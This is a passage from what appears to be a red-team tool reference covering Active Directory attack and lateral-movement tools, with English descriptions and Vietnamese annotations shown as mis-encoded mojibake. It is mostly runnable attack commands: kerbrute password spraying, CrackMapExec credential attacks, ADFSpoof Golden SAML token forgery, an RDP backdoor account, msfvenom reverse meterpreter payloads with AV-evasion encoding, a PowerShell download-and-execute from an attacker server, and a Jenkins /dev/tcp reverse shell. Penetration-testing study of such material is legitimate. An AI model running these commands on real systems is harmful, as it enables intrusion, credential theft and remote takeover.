![adidnsdump](https://user-images.githubusercontent.com/100603074/210986363-724e6611-12e9-4a0d-abfa-c44665010b97.jpg)

*HÃ¬nh áº£nh Ä‘Æ°á»£c sá»­ dá»¥ng tá»« https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/*

### [ğŸ”™](#tool-list)[**kerbrute**](https://github.com/ropnop/kerbrute)

A tool to quickly bruteforce and enumerate valid **Active Directory accounts** through **Kerberos Pre-Authentication**.

**Install (Go):**

```bash
go get github.com/ropnop/kerbrute
```
**LÆ°u Ã½:** CÃ i Ä‘áº·t **cÃ´ng cá»¥ Golang** **kerbrute**.

**Install (Make):**

```bash
git clone https://github.com/ropnop/kerbrute
cd kerbrute
make all
```
**LÆ°u Ã½:** BiÃªn dá»‹ch tá»« mÃ£ nguá»“n báº±ng **Git** vÃ  **Make**.

**CÃ¡ch sá»­ dá»¥ng:**

```bash
# Liá»‡t kÃª ngÆ°á»i dÃ¹ng
./kerbrute_linux_amd64 userenum -d lab.ropnop.com usernames.txt

# Password Spray
./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com domain_users.txt Password123

# Brute User
./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com passwords.lst thoffman

# Brute Force
./kerbrute -d lab.ropnop.com bruteforce -
```
**LÆ°u Ã½:** CÃ¡c vÃ­ dá»¥ sá»­ dá»¥ng tá»‡p nhá»‹ phÃ¢n `kerbrute` trÃªn **Linux**. `-d` chá»‰ Ä‘á»‹nh tÃªn miá»n **Active Directory**. `userenum` thá»±c hiá»‡n liá»‡t kÃª tÃªn ngÆ°á»i dÃ¹ng tá»« má»™t danh sÃ¡ch (`usernames.txt`) thÃ´ng qua pháº£n há»“i lá»—i **Kerberos pre-authentication**. `passwordspray` thá»±c hiá»‡n táº¥n cÃ´ng password spray (`Password123`) lÃªn má»™t danh sÃ¡ch ngÆ°á»i dÃ¹ng domain (`domain_users.txt`). `bruteuser` **brute force** máº­t kháº©u cho má»™t ngÆ°á»i dÃ¹ng cá»¥ thá»ƒ (`thoffman`) tá»« má»™t wordlist máº­t kháº©u (`passwords.lst`).

![image](https://user-images.githubusercontent.com/100603074/212205129-e5906b50-78c5-4507-8b1e-74a6686bed14.png)

*HÃ¬nh áº£nh Ä‘Æ°á»£c sá»­ dá»¥ng tá»« https://matthewomccorkle.github.io/day_032_kerbrute/*

### [ğŸ”™](#tool-list)[**scavenger**](https://github.com/SpiderLabs/scavenger)

**Scavenger** is a multi-threaded **post-exploitation** scanning tool for scavenging systems, finding most frequently used files and folders as well as "interesting" files containing sensitive information.

**Scavenger** confronts a challenging issue typically faced by **Penetration Testing** consultants during internal penetration tests; the issue of having too much access to too many systems with limited days for testing.

**Install:**

First install **CrackMapExec** from [táº¡i Ä‘Ã¢y](https://github.com/byt3bl33d8d/CrackMapExec/wiki/Installation).
**LÆ°u Ã½:** **Scavenger** phá»¥ thuá»™c vÃ o **CrackMapExec**, vÃ¬ váº­y cáº§n cÃ i Ä‘áº·t **CME** trÆ°á»›c.

```bash
git clone https://github.com/SpiderLabs/scavenger
cd scavenger
```
**LÆ°u Ã½:** Táº£i mÃ£ nguá»“n cá»§a **Scavenger**.

**CÃ¡ch sá»­ dá»¥ng:**

```bash
# TÃ¬m cÃ¡c tá»‡p Ä‘Ã¡ng chÃº Ã½ trÃªn Ä‘iá»ƒm cuá»‘i cá»§a náº¡n nhÃ¢n
python3 ./scavenger.py smb -t 10.0.0.10 -u administrator -p Password123 -d test.local
```
**LÆ°u Ã½:** Cháº¡y **script Python scavenger.py**. `smb` chá»‰ Ä‘á»‹nh giao thá»©c Ä‘á»ƒ quÃ©t (**SMB file shares**). `-t` lÃ  IP má»¥c tiÃªu. `-u`, `-p`, `-d` cung cáº¥p thÃ´ng tin xÃ¡c thá»±c **domain** Ä‘á»ƒ truy cáº­p cÃ¡c share. **Scavenger** sáº½ tÃ¬m kiáº¿m cÃ¡c tá»‡p vÃ  thÆ° má»¥c theo cÃ¡c quy táº¯c Ä‘á»‹nh sáºµn Ä‘á»ƒ phÃ¡t hiá»‡n thÃ´ng tin nháº¡y cáº£m.

Nice [blog post](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/scavenger-post-exploitation-tool-for-collecting-vital-data/).

![image](https://user-images.githubusercontent.com/100603074/216736914-e7a7fe26-3531-4ae1-9962-fce130d8ab62.png)

*HÃ¬nh áº£nh Ä‘Æ°á»£c sá»­ dá»¥ng tá»« https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/scavenger-post-exploitation-tool-for-collecting-vital-data/*

**Lateral Movement**
====================

### [ğŸ”™](#tool-list)[**crackmapexec**](https://github.com/Porchetta-Industries/CrackMapExec)

This is a great tool for pivoting in a **Windows/Active Directory** environment using credential pairs (**username:password**, **username:hash**). It also offered other features including enumerating logged on users and spidering SMB shares to executing psexec style attacks, auto-injecting Mimikatz/Shellcode/DLLâ€™s into memory using Powershell, dumping the NTDS.dit and more.

**Install:**

```bash
sudo apt install crackmapexec
```
**LÆ°u Ã½:** CÃ i Ä‘áº·t tiÃªu chuáº©n trÃªn **Linux/Debian/Ubuntu** sá»­ dá»¥ng **apt**.

**CÃ¡ch sá»­ dá»¥ng:**

```bash
crackmapexec smb <ip address> -d <domain> -u <user list> -p <password list>
```
**LÆ°u Ã½:** Sá»­ dá»¥ng `crackmapexec` vá»›i subcommand `smb` Ä‘á»ƒ tÆ°Æ¡ng tÃ¡c qua giao thá»©c **SMB**. `<ip address>` lÃ  IP cá»§a mÃ¡y má»¥c tiÃªu hoáº·c dáº£i IP/file IP. `-d` lÃ  tÃªn domain. `-u` vÃ  `-p` cung cáº¥p danh sÃ¡ch ngÆ°á»i dÃ¹ng vÃ  máº­t kháº©u/hash Ä‘á»ƒ thá»­ Ä‘Äƒng nháº­p vÃ o mÃ¡y má»¥c tiÃªu. Sau khi Ä‘Äƒng nháº­p thÃ nh cÃ´ng, **CrackMapExec** cÃ³ thá»ƒ thá»±c hiá»‡n nhiá»u tÃ¡c vá»¥ khÃ¡c nhÆ° thá»±c thi lá»‡nh, liá»‡t kÃª session, truy cáº­p share...

![image](https://user-images.githubusercontent.com/100603074/192070626-4549ec06-e2c5-477b-a97d-0f29e48bbfbc.png)

### [ğŸ”™](#tool-list)[**WMIOps**](https://github.com/FortyNorthSecurity/WMIOps)

**WMIOps** is a powershell script that uses WMI to perform a variety of actions on hosts, local or remote, within a Windows environment.

Developed by [@christruncer](https://twitter.com/christruncer).

Original [blog post](https://www.christophertruncer.com/introducing-wmi-ops/) documenting release.

**Install (PowerShell):**

```bash
git clone https://github.com/FortyNorthSecurity/WMIOps
Import-Module WMIOps.ps1
```
**LÆ°u Ã½:** Táº£i mÃ£ nguá»“n script **PowerShell** vÃ  import nÃ³ vÃ o phiÃªn PowerShell hiá»‡n táº¡i.

**CÃ¡ch sá»­ dá»¥ng:**

```bash
# Thá»±c thi lá»‡nh do ngÆ°á»i dÃ¹ng chá»‰ Ä‘á»‹nh trÃªn mÃ¡y má»¥c tiÃªu
Invoke-ExecCommandWMI

# Tráº£ vá» táº¥t cáº£ cÃ¡c tiáº¿n trÃ¬nh Ä‘ang cháº¡y tá»« mÃ¡y má»¥c tiÃªu
Get-RunningProcessesWMI

# Kiá»ƒm tra xem ngÆ°á»i dÃ¹ng cÃ³ hoáº¡t Ä‘á»™ng táº¡i desktop trÃªn mÃ¡y má»¥c tiÃªu khÃ´ng (hoáº·c náº¿u váº¯ng máº·t)
Find-ActiveUsersWMI

# Liá»‡t kÃª táº¥t cáº£ cÃ¡c á»• Ä‘Ä©a cá»¥c bá»™ vÃ  Ä‘Æ°á»£c káº¿t ná»‘i máº¡ng trÃªn há»‡ thá»‘ng má»¥c tiÃªu
Get-SystemDrivesWMI

# Thá»±c thi má»™t script powershell trong bá»™ nhá»› trÃªn mÃ¡y chá»§ má»¥c tiÃªu thÃ´ng qua WMI vÃ  tráº£ vá» káº¿t quáº£
Invoke-RemoteScriptWithOutput
```
**LÆ°u Ã½:** CÃ¡c hÃ m (cmdlet) cá»§a module **WMIOps**. ChÃºng sá»­ dá»¥ng **WMI** Ä‘á»ƒ thá»±c hiá»‡n cÃ¡c tÃ¡c vá»¥ tá»« xa trÃªn cÃ¡c mÃ¡y **Windows** má»¥c tiÃªu. Cáº§n quyá»n quáº£n trá»‹ trÃªn mÃ¡y má»¥c tiÃªu Ä‘á»ƒ thá»±c hiá»‡n háº§u háº¿t cÃ¡c tÃ¡c vá»¥ nÃ y thÃ´ng qua **WMI**.

![image](https://user-images.githubusercontent.com/100603074/210266302-9c098f03-24fd-4f91-af63-db2fe04c01c7.png)

![image](https://user-images.githubusercontent.com/100603074/210266314-e51c7c99-1e2a-473e-926c-074b56fe79a5.png)

*Images used from https://pentestlab.blog/2017/11/20/command-and-control-wmi/*

### [ğŸ”™](#tool-list)[**PowerLessShell**](https://github.com/Mr-Un1k0d3r/PowerLessShell)

Tool that uses **MSBuild.exe** to remotely execute **PowerShell scripts** and commands without spawning **powershell.exe**.

**Install:**

```bash
git clone https://github.com/Mr-Un1k0d3r/PowerLessShell
cd PowerLessShell
```
**LÆ°u Ã½:** Táº£i mÃ£ nguá»“n báº±ng **Git**. CÃ´ng cá»¥ nÃ y chá»§ yáº¿u dá»±a vÃ o má»™t **script Python** Ä‘á»ƒ táº¡o cÃ¡c file dá»± Ã¡n **MSBuild**.

**CÃ¡ch sá»­ dá»¥ng:**

```bash
# Help
python PowerLessShell.py -h

# Generate PowerShell payload
python PowerLessShell.py -type powershell -source script.ps1 -output malicious.csproj

# Generating a shellcode payload
python PowerLessShell.py -source shellcode.raw -output malicious.csproj
```
**LÆ°u Ã½:** Sá»­ dá»¥ng **script Python PowerLessShell.py**. CÃ´ng cá»¥ nÃ y táº¡o ra má»™t file `.csproj` (file dá»± Ã¡n **Visual Studio**) chá»©a mÃ£ **XML** lá»£i dá»¥ng chá»©c nÄƒng tÃ­ch há»£p sáºµn cá»§a **MSBuild.exe** Ä‘á»ƒ thá»±c thi mÃ£ tÃ¹y Ã½. File `.csproj` Ä‘Æ°á»£c táº¡o nÃ y sau Ä‘Ã³ cÃ³ thá»ƒ Ä‘Æ°á»£c cháº¡y trÃªn mÃ¡y **Windows** má»¥c tiÃªu báº±ng **MSBuild.exe**. Äiá»u nÃ y giÃºp thá»±c thi **PowerShell** hoáº·c shellcode mÃ  khÃ´ng trá»±c tiáº¿p cháº¡y tiáº¿n trÃ¬nh **powershell.exe**.

Full usage information can be found [táº¡i Ä‘Ã¢y](https://github.com/Mr-Un1k0d3r/PowerLessShell#usage).

![image](https://user-images.githubusercontent.com/100603074/210266357-75a3f09d-9855-46d5-ad13-69c677b4499f.png)

*Image used from https://bank-security.medium.com/how-to-running-powershell-commands-without-powershell-exe-a6a19595f628*

### [ğŸ”™](#tool-list)[**PsExec**](https://learn.microsoft.com/en-us/sysinternals/downloads/psexec)

**PsExec** is a part of the **Sysinternals** suite of tools, which is a collection of utilities for managing and troubleshooting **Windows systems**.

It is great for remotely executing commands on target machines.

**Note:** Some AVs detect **PsExec** as a 'remote admin' virus.
**LÆ°u Ã½:** **PsExec** lÃ  má»™t **cÃ´ng cá»¥** chÃ­nh thá»‘ng cá»§a **Microsoft** nhÆ°ng do kháº£ nÄƒng thá»±c thi tá»« xa cá»§a nÃ³, nÃ³ thÆ°á»ng bá»‹ **AV** gáº¯n cá» nhÆ° má»™t cÃ´ng cá»¥ quáº£n trá»‹ tá»« xa cÃ³ kháº£ nÄƒng bá»‹ láº¡m dá»¥ng (Potentially Unwanted Application - **PUA** hoáº·c "hacker tool").

**Install (PowerShell):**

```bash
Invoke-WebRequest -Uri 'https://download.sysinternals.com/files/PSTools.zip' -OutFile 'pstools.zip'
Expand-Archive -Path 'pstools.zip' -DestinationPath "$env:TEMP\pstools"
Move-Item -Path "$env:TEMP\pstools\psexec.exe" .
Remove-Item -Path "$env:TEMP\pstools" -Recurse
```
**LÆ°u Ã½:** Äoáº¡n mÃ£ **PowerShell** nÃ y táº£i vá» gÃ³i **PSTools** cá»§a **Sysinternals**, giáº£i nÃ©n, di chuyá»ƒn chá»‰ tá»‡p **psexec.exe** vÃ o thÆ° má»¥c hiá»‡n táº¡i vÃ  xÃ³a cÃ¡c tá»‡p táº¡m thá»i. CÃ¡ch cÃ i Ä‘áº·t tiá»‡n lá»£i trÃªn **Windows PowerShell**.

**CÃ¡ch sá»­ dá»¥ng:**

```bash
# Prevent the license agreement from being displayed
psexec.exe /accepteula

# Run the 'hostname' command on remote machine
psexec.exe \\REMOTECOMPUTER hostname

# Run the 'hostname' command on EVERYTHING (on the domain)
psexec.exe \\* hostname

# Run a local executable on a remote machine
psexec.exe \\REMOTECOMPUTER -c C:\Tools\program.exe

# Run the 'hostname' command with different credentials
psexec.exe \\REMOTECOMPUTER hostname -u localadmin -p secret-p@$$word

# Spawn shell on remote machine
psexec.exe -s \\REMOTECOMPUTER cmd
```
**LÆ°u Ã½:** CÃ¡c vÃ­ dá»¥ sá»­ dá»¥ng **PsExec.exe** vá»›i cÃ¡c tÃ¹y chá»n dÃ²ng lá»‡nh. Cáº§n quyá»n quáº£n trá»‹ trÃªn mÃ¡y tÃ­nh tá»« xa Ä‘á»ƒ sá»­ dá»¥ng **PsExec**. `\\REMOTECOMPUTER` Ä‘Æ°á»£c thay tháº¿ báº±ng tÃªn mÃ¡y tÃ­nh hoáº·c Ä‘á»‹a chá»‰ IP. `/accepteula` bá» qua yÃªu cáº§u cháº¥p nháº­n EULA láº§n Ä‘áº§u. `-c` copy file thá»±c thi tá»« mÃ¡y local Ä‘áº¿n mÃ¡y remote vÃ  cháº¡y nÃ³. `-u` vÃ  `-p` cung cáº¥p thÃ´ng tin xÃ¡c thá»±c. `-s` cháº¡y tiáº¿n trÃ¬nh vá»›i quyá»n SYSTEM trÃªn mÃ¡y tá»« xa, há»¯u Ã­ch Ä‘á»ƒ cÃ³ shell **SYSTEM**. **PsExec** sá»­ dá»¥ng káº¿t ná»‘i **SMB** vÃ  dá»‹ch vá»¥ áº©n (psexesvc) Ä‘á»ƒ thá»±c thi.

Great [blog post](https://adamtheautomator.com/psexec/) on **PsExec** usage.

![image](https://user-images.githubusercontent.com/100603074/210266376-8daa51d6-16d4-4422-b723-d1bc8b7f22e2.png)

*Image used from https://adamtheautomator.com/psexec/*

### [ğŸ”™](#tool-list)[**LiquidSnake**](https://github.com/RiccardoAncarani/LiquidSnake)

**Liquid Snake** is a program aimed at performing **lateral movement** against **Windows systems** without touching the disk.

The tool relies on **WMI Event Subscription** in order to execute a **.NET assembly** in memory, the **.NET assembly** will listen for a shellcode on a named pipe and then execute it using a variation of the thread hijacking shellcode injection.

The project is composed by two separate solutions:

- `CSharpNamedPipeLoader` - the component that will be transformed in **VBS** via **GadgetToJScript**
- `LiquidSnake` - the component responsible to creating the **WMI Event Subscription** on the remote system

**Install:**

Open both solutions in Visual Studio and build. *Make sure to target x64 architecture for the **CSharpNamedPipeLoader**.*

Output: Two separate EXEs: `CSharpNamedPipeLoader.exe` and `LiquidSnake.exe`
**LÆ°u Ã½:** HÆ°á»›ng dáº«n biÃªn dá»‹ch mÃ£ nguá»“n C# báº±ng **Visual Studio**. Cáº§n táº¡o ra hai file thá»±c thi riÃªng biá»‡t.

Full build information can be found [táº¡i Ä‘Ã¢y](https://github.com/RiccardoAncarani/LiquidSnake#building).

**CÃ¡ch sá»­ dá»¥ng:**

Use `LiquidSnake.exe` agains a host where you have administrative access over as follows:

```bash
LiquidSnake.exe <host> [<username> <password> <domain>]
LiquidSnake.exe dc01.isengard.local
LiquidSnake.exe dc01.isengard.local saruman DeathToFrodo123 isengard.local
```
**LÆ°u Ã½:** Lá»‡nh cháº¡y cÃ´ng cá»¥ chÃ­nh `LiquidSnake.exe` trÃªn mÃ¡y attacker, káº¿t ná»‘i Ä‘áº¿n mÃ¡y **Windows** má»¥c tiÃªu tá»« xa (`<host>`) báº±ng thÃ´ng tin xÃ¡c thá»±c Ä‘Æ°á»£c cung cáº¥p. CÃ´ng cá»¥ nÃ y sáº½ sá»­ dá»¥ng **WMI** Ä‘á»ƒ táº¡o má»™t sá»± kiá»‡n Ä‘Äƒng kÃ½ (event subscription) thá»±c thi loader (`CSharpNamedPipeLoader.exe`, Ä‘Ã£ Ä‘Æ°á»£c nhÃºng trong VBS hoáº·c JScript?) trong bá»™ nhá»› cá»§a tiáº¿n trÃ¬nh trÃªn mÃ¡y remote. Loader nÃ y sau Ä‘Ã³ sáº½ láº¯ng nghe trÃªn má»™t named pipe Ä‘á»ƒ nháº­n shellcode tá»« attacker.

If everything went fine, you should obtain an output similar as the following:

```bash
[*] Event filter created.
[*] Event consumer created.
[*] Subscription created, now sleeping
[*] Sending some DCOM love..
[*] Sleeping again... long day
```

General usage information can be found [táº¡i Ä‘Ã¢y](https://github.com/RiccardoAncarani/LiquidSnake#usage).

Full `LiquidSnake` usage information can be found [táº¡i Ä‘Ã¢y](https://github.com/RiccardoAncarani/LiquidSnake/tree/main/LiquidSnake).

![LiquidSnake](https://user-images.githubusercontent.com/100603074/210986763-2ffe49dd-597b-4ca2-a3ad-674b5fe39624.jpg)

*Image used from https://github.com/RiccardoAncarani/LiquidSnake#usage*

### [ğŸ”™](#tool-list)Báº­t **RDP**

```shell
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
net localgroup "Remote Desktop Users" "backdoor" /add
```
**LÆ°u Ã½:** Bá»™ lá»‡nh nÃ y Ä‘Æ°á»£c thá»±c thi trÃªn **CMD/PowerShell** cá»§a mÃ¡y **Windows** má»¥c tiÃªu Ä‘á»ƒ báº­t **Remote Desktop Protocol (RDP)** vÃ  cho phÃ©p truy cáº­p.
`reg add ... fDenyTSConnections /d 0`: Thay Ä‘á»•i registry Ä‘á»ƒ cho phÃ©p káº¿t ná»‘i RDP.
`netsh ... enable=Yes`: Báº­t quy táº¯c firewall tÃ­ch há»£p sáºµn cho Remote Desktop.
`net localgroup ... /add`: ThÃªm má»™t tÃ i khoáº£n ngÆ°á»i dÃ¹ng (á»Ÿ Ä‘Ã¢y lÃ  'backdoor', giáº£ Ä‘á»‹nh Ä‘Ã£ táº¡o tÃ i khoáº£n nÃ y) vÃ o nhÃ³m "Remote Desktop Users" cá»¥c bá»™ Ä‘á»ƒ cho phÃ©p tÃ i khoáº£n nÃ y Ä‘Äƒng nháº­p qua RDP. Cáº§n quyá»n quáº£n trá»‹ Ä‘á»ƒ cháº¡y cÃ¡c lá»‡nh nÃ y.

### [ğŸ”™](#tool-list)NÃ¢ng cáº¥p shell lÃªn **meterpreter**

Shells (https://infinitelogins.com/tag/payloads/)

After getting basic shell access to an endpoint a **meterpreter** is nicer to continue with.
**LÆ°u Ã½:** **Meterpreter** lÃ  má»™t **payload** háº­u khai thÃ¡c tiÃªn tiáº¿n cá»§a **Metasploit** cung cáº¥p nhiá»u kháº£ nÄƒng hÆ¡n **reverse shell** Ä‘Æ¡n giáº£n.

**[attacker]** Generate a meterpreter shell:

```shell
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=[IP] LPORT=[PORT] -f exe -o [SHELL NAME].exe
msfvenom -p linux/x86/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
```
**LÆ°u Ã½:** Sá»­ dá»¥ng `msfvenom` Ä‘á»ƒ táº¡o tá»‡p thá»±c thi **reverse meterpreter** cho **Windows** hoáº·c **Linux**. `-p` chá»‰ Ä‘á»‹nh payload, `-a` kiáº¿n trÃºc, `--encoder` mÃ£ hÃ³a shellcode Ä‘á»ƒ nÃ© trÃ¡nh **AV** (shikata_ga_nai lÃ  encoder ná»•i tiáº¿ng), `LHOST/LPORT` Ä‘á»‹a chá»‰/cá»•ng cá»§a attacker, `-f` Ä‘á»‹nh dáº¡ng output, `-o` tÃªn file output.

![image](https://user-images.githubusercontent.com/100603074/193451669-ff745cf6-e103-4f7e-a266-f7f224dfbb0a.png)

**[victim]** Download to victim endpoint:

```shell
powershell "(New-Object System.Net.WebClient).Downloadfile('http://<ip>:8000/shell-name.exe','shell-name.exe')"`
```
**LÆ°u Ã½:** Lá»‡nh **PowerShell** táº£i tá»‡p thá»±c thi **shell** Ä‘Ã£ táº¡o vá» mÃ¡y náº¡n nhÃ¢n tá»« má»™t web server do attacker Ä‘iá»u khiá»ƒn (`http://<ip>:8000`).

**[attacker]** Configure listener:

```shell
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST your-ip
set LPORT listening-port run`
```
**LÆ°u Ã½:** (ÄÃ£ giáº£i thÃ­ch á»Ÿ trÃªn) Thiáº¿t láº­p listener trong **Metasploit Framework** Ä‘á»ƒ nháº­n káº¿t ná»‘i ngÆ°á»£c láº¡i tá»« payload **meterpreter**.

**[victim]** Execute payload:

```shell
Start-Process "shell-name.exe"`
```
**LÆ°u Ã½:** Lá»‡nh **PowerShell** Ä‘á»ƒ thá»±c thi tá»‡p shell Ä‘Ã£ táº£i xuá»‘ng trÃªn mÃ¡y náº¡n nhÃ¢n. Khi cháº¡y, nÃ³ sáº½ káº¿t ná»‘i ngÆ°á»£c vá» listener cá»§a attacker.

![image](https://user-images.githubusercontent.com/100603074/193452305-91b769a7-96c4-43d3-b3e2-6e31b3afec27.png)

### [ğŸ”™](#tool-list)Forwarding Ports

Sometimes, after gaining access to an endpoint there are local ports. Making these internal ports external routable can help for lateral movement to other services on the host.
**LÆ°u Ã½:** **Port forwarding** lÃ  ká»¹ thuáº­t cho phÃ©p attacker truy cáº­p cÃ¡c dá»‹ch vá»¥ chá»‰ cÃ³ sáºµn trÃªn máº¡ng ná»™i bá»™/loopback cá»§a mÃ¡y náº¡n nhÃ¢n tá»« mÃ¡y cá»§a attacker.

```bash
socat TCP-LISTEN:8888,fork TCP:127.0.0.1:80 &
socat TCP-LISTEN:EXTERNAL_PORT,fork TCP:127.0.0.1:INTERNAL_PORT &
```
**LÆ°u Ã½:** CÃ¡c lá»‡nh nÃ y sá»­ dá»¥ng **cÃ´ng cá»¥ `socat`** (Socket CAT) trÃªn mÃ¡y náº¡n nhÃ¢n (thÆ°á»ng lÃ  **Linux**, cáº§n cÃ i Ä‘áº·t `socat`) Ä‘á»ƒ thá»±c hiá»‡n **port forwarding**. `TCP-LISTEN:EXTERNAL_PORT,fork` táº¡o má»™t listener TCP trÃªn cá»•ng `EXTERNAL_PORT` trÃªn mÃ¡y náº¡n nhÃ¢n. Khi cÃ³ káº¿t ná»‘i Ä‘áº¿n cá»•ng nÃ y, nÃ³ sáº½ táº¡o má»™t tiáº¿n trÃ¬nh con (`fork`) vÃ  chuyá»ƒn tiáº¿p (`TCP:127.0.0.1:INTERNAL_PORT`) káº¿t ná»‘i Ä‘áº¿n dá»‹ch vá»¥ Ä‘ang cháº¡y trÃªn `127.0.0.1:INTERNAL_PORT` (vÃ­ dá»¥: dá»‹ch vá»¥ web trÃªn cá»•ng 80 hoáº·c dá»‹ch vá»¥ khÃ¡c). Dáº¥u `&` Ä‘á»ƒ cháº¡y lá»‡nh trong ná»n. **EXTERNAL_PORT** sáº½ lÃ  cá»•ng mÃ  attacker káº¿t ná»‘i tá»›i trÃªn mÃ¡y náº¡n nhÃ¢n, cÃ²n **INTERNAL_PORT** lÃ  cá»•ng cá»§a dá»‹ch vá»¥ trÃªn mÃ¡y náº¡n nhÃ¢n.

### [ğŸ”™](#tool-list)Jenkins reverse shell

If you gain access to a **jenkins script console** you can use this to gain a **reverse shell** on the node.
**LÆ°u Ã½:** Jenkins lÃ  má»™t server automation phá»• biáº¿n. Script Console lÃ  má»™t tÃ­nh nÄƒng cho phÃ©p cháº¡y mÃ£ Groovy tÃ¹y Ã½ trÃªn server hoáº·c agent. Náº¿u káº» táº¥n cÃ´ng cÃ³ quyá»n truy cáº­p Script Console, há» cÃ³ thá»ƒ lá»£i dá»¥ng Ä‘á»ƒ cÃ³ shell trÃªn mÃ¡y Ä‘Ã³.

```jenkins
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/IP_ADDRESS/PORT;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
**LÆ°u Ã½:** ÄÃ¢y lÃ  mÃ£ **Groovy** (hoáº·c Java snippet) Ä‘Æ°á»£c thá»±c thi trong Jenkins Script Console trÃªn má»™t agent **Linux/Unix**. NÃ³ sá»­ dá»¥ng **Java Runtime** Ä‘á»ƒ thá»±c thi lá»‡nh shell (`/bin/bash -c ...`). Lá»‡nh bash táº¡o káº¿t ná»‘i **TCP** ngÆ°á»£c Ä‘áº¿n `IP_ADDRESS:PORT` cá»§a attacker vÃ  táº¡o má»™t reverse shell tÆ°Æ¡ng tÃ¡c qua káº¿t ná»‘i Ä‘Ã³. ÄÃ¢y lÃ  má»™t ká»¹ thuáº­t ráº¥t hiá»‡u quáº£ náº¿u Script Console khÃ´ng bá»‹ háº¡n cháº¿.

### [ğŸ”™](#tool-list)[**ADFSpoof**](https://github.com/mandiant/ADFSpoof)

Created by Doug Bienstock [@doughsec](https://twitter.com/doughsec) while at Mandiant FireEye.

**ADFSpoof** has two main functions:

1. Given the **EncryptedPFX** blob from the **AD FS** configuration database and **DKM decryption key** from **Active Directory**, produce a usable key/cert pair for **token signing**.
2. Given a signing key, produce a signed security token that can be used to access a federated application.

This tool is meant to be used in conjunction with **ADFSDump**. **ADFSDump** runs on an **AD FS server** and outputs important information that you will need to use **ADFSpoof**.

**Install:**

**Note:** ***ADFSpoof** requires the installation of a custom fork of the **Python Cryptography package**, available [táº¡i Ä‘Ã¢y](https://github.com/dmb2168/cryptography).*
**LÆ°u Ã½:** YÃªu cáº§u **Python** vÃ  thÆ° viá»‡n **cryptography**, vá»›i lÆ°u Ã½ cáº§n dÃ¹ng má»™t báº£n fork tÃ¹y chá»‰nh.

```bash
git clone https://github.com/mandiant/ADFSpoof
pip install -r requirements.txt
```
**LÆ°u Ã½:** Táº£i mÃ£ nguá»“n vÃ  cÃ i Ä‘áº·t cÃ¡c dependency Python.

**CÃ¡ch sá»­ dá»¥ng:**

```bash
# Decrypt the EncryptedPFX and write to disk
python ADFSpoof.py -b EncryptedPfx.bin DKMkey.bin dump

# Generate a security token for Office365
python ADFSpoof.py -b EncryptedPfx.bin DkmKey.bin -s sts.doughcorp.com o365 --upn robin@doughcorp.co --objectguid {1C1D4BA4-B513-XXX-XXX-3308B907D759
```
**LÆ°u Ã½:** Sá»­ dá»¥ng **script Python ADFSpoof.py**. CÃ´ng cá»¥ nÃ y xá»­ lÃ½ cÃ¡c output tá»« **ADFSDump** (`EncryptedPFX.bin` vÃ  `DKMkey.bin`). Cháº¿ Ä‘á»™ `dump` trÃ­ch xuáº¥t key/cert signing. Cháº¿ Ä‘á»™ táº¡o token (á»Ÿ Ä‘Ã¢y lÃ  cho `o365` qua `sts.doughcorp.com`) sá»­ dá»¥ng key signing Ä‘á»ƒ táº¡o má»™t **token SAML** giáº£ máº¡o vá»›i **User Principal Name (UPN)** vÃ  **ObjectGUID** cá»§a ngÆ°á»i dÃ¹ng má»¥c tiÃªu. **Golden SAML attack** cho phÃ©p truy cáº­p vÃ o cÃ¡c dá»‹ch vá»¥ **Microsoft 365/Azure** nhÆ° ngÆ°á»i dÃ¹ng má»¥c tiÃªu mÃ  khÃ´ng cáº§n máº­t kháº©u hoáº·c MFA, báº±ng cÃ¡ch giáº£ máº¡o viá»‡c xÃ¡c thá»±c tá»« **AD FS**.

Full usage information can be found [táº¡i Ä‘Ã¢y](https://github.com/mandiant/ADFSpoof#usage).

Additional command examples can be found [táº¡i Ä‘Ã¢y](https://github.com/mandiant/ADFSpoof#examples).

![image](https://user-images.githubusercontent.com/100603074/211530527-02e63fe3-5dda-4a81-8895-c140aec4eeca.png)

*HÃ¬nh áº£nh Ä‘Æ°á»£c sá»­ dá»¥ng tá»« https://github.com/mandiant/ADFSpoof#usage*

### [ğŸ”™](#tool-list)[**Coercer**](https://github.com/p0dalirius/Coercer)

A python script to automatically coerce a Windows server to authenticate on an arbitrary machine through many methods.

Features:

- Lists open **SMB pipes** on the remote machine (in modes scan authenticated and fuzz authenticated)
-  Tries to connect on a list of known **SMB pipes** on the remote machine (in modes scan unauthenticated and fuzz unauthenticated)
-  Calls one by one all the vulnerable **RPC** functions to coerce the server to authenticate on an arbitrary machine.
-  Random UNC paths generation to avoid caching failed attempts (all modes)
-  Configurable delay between attempts with `--delay`

More feature information [táº¡i Ä‘Ã¢y](https://github.com/p0dalirius/Coercer#features).

**Install (pip):**

```bash
sudo python3 -m pip install coercer
```
**LÆ°u Ã½:** CÃ i Ä‘áº·t cÃ´ng cá»¥ tá»« **PyPI** báº±ng `pip`.

**CÃ¡ch sá»­ dá»¥ng:**

```bash
# Scan mode (Assess the Remote Procedure Calls listening on a machine)
./Coercer.py scan -t 192.168.1.1 -u 'username' -p 'password' -d test.locl -v

# Coerce mode (Exploit the Remote Procedure Calls on a remote machine to coerce an authentication to ntlmrelay or responder)
./Coercer.py coerce -l 192.168.1.2 -t 192.168.1.1 -u 'username' -p 'password' -d test.locl -v

# Fuzz mode (Fuzz Remote Procedure Calls listening on a machine)
./Coercer.py fuzz -t 192.168.1.1 -u 'username' -p 'password' -d test.locl -v
```
